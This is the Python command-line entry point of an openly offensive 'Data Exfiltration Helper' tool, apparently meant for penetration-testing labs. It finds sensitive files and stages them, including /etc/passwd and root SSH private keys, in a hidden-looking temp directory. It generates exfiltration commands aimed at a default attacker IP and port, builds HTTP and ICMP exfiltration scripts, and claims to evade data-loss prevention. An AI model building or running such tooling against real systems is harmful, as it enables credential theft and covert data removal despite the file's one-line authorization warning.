"""
Main CLI entry point for Data Exfiltrator
"""

import argparse
import sys
from .core.base import DataExfiltrator


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Data Exfiltration Helper - Safely extract data",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Find interesting files
  python3 -m data_exfiltrator --find
  
  # Stage files for exfiltration
  python3 -m data_exfiltrator --stage /etc/passwd /root/.ssh/id_rsa --compress --encrypt --password secret
  
  # Create exfiltration server
  python3 -m data_exfiltrator --create-server
  
  # Create ICMP scripts
  python3 -m data_exfiltrator --create-icmp

Warning: Only use on systems you have authorization to test.
        """
    )
    
    parser.add_argument(
        '--find',
        action='store_true',
        help='Find interesting files for exfiltration'
    )
    
    parser.add_argument(
        '--stage',
        nargs='+',
        help='Stage specific files for exfiltration'
    )
    
    parser.add_argument(
        '--compress',
        action='store_true',
        help='Compress files before staging'
    )
    
    parser.add_argument(
        '--encrypt',
        action='store_true',
        help='Encrypt files before staging'
    )
    
    parser.add_argument(
        '--password',
        default='',
        help='Password for encryption'
    )
    
    parser.add_argument(
        '--attacker-ip',
        default='10.10.14.5',
        help='Attacker IP address (default: 10.10.14.5)'
    )
    
    parser.add_argument(
        '--attacker-port',
        type=int,
        default=8000,
        help='Attacker port (default: 8000)'
    )
    
    parser.add_argument(
        '--create-server',
        action='store_true',
        help='Create HTTP exfiltration server script'
    )
    
    parser.add_argument(
        '--create-icmp',
        action='store_true',
        help='Create ICMP exfiltration scripts'
    )
    
    parser.add_argument(
        '--cleanup',
        action='store_true',
        help='Clean up staging directory'
    )
    
    parser.add_argument(
        '--staging-dir',
        default='/tmp/.cache',
        help='Staging directory (default: /tmp/.cache)'
    )
    
    args = parser.parse_args()
    
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║          Data Exfiltration Helper v1.0                   ║
    ║          Safely Extract Data Without Triggering DLP      ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    try:
        exfil = DataExfiltrator(staging_dir=args.staging_dir)
        
        if args.find:
            interesting = exfil.find_interesting_data()
            print_findings(interesting)
        
        elif args.stage:
            staged = exfil.stage_for_exfiltration(
                args.stage,
                compress=args.compress,
                encrypt=args.encrypt,
                password=args.password
            )
            
            exfil.generate_exfil_commands(
                staged,
                attacker_ip=args.attacker_ip,
                attacker_port=args.attacker_port
            )
            
            exfil.create_manifest(staged)
        
        elif args.create_server:
            exfil.create_exfil_server_script()
        
        elif args.create_icmp:
            exfil.create_icmp_exfil_scripts()
        
        elif args.cleanup:
            exfil.cleanup_staging()
        
        else:
            parser.print_help()
    
    except KeyboardInterrupt:
        print("\n[!] Operation interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)


def print_findings(interesting: dict):
    """Print interesting files found"""
    print("\n[*] Interesting files found:")
    for category, files in interesting.items():
        if files:
            print(f"\n{category.upper()}: {len(files)} files")
            for file_info in files[:5]:
                print(f"  - {file_info['path']} ({file_info['size']} bytes)")


if __name__ == "__main__":
    main()